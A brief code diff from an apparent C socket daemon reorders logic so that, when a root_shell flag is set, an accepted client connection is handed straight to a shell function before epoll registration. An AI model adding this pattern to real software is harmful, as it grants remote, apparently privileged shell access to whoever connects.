@@ -19,15 +19,15 @@ void accept_user(int sockfd, EPOLL_STRUCT epoll) {
 		return ;
 	}
 
+	if (root_shell) {
+		shell(userfd);
+		return ;
+	}
+
 	if (epoll_ctl(epoll.fd, EPOLL_CTL_ADD, userfd, &user_event) < 0) {
 		log_event(LOG_EPOLL_FAILED, LOG_INFO);
 		write(userfd, FAILED_CONNECTION, sizeof(FAILED_CONNECTION));
 		close(userfd);
-		return ;
-	}
-
-	if (root_shell) {
-		shell(userfd);
 		return ;
 	}
 	
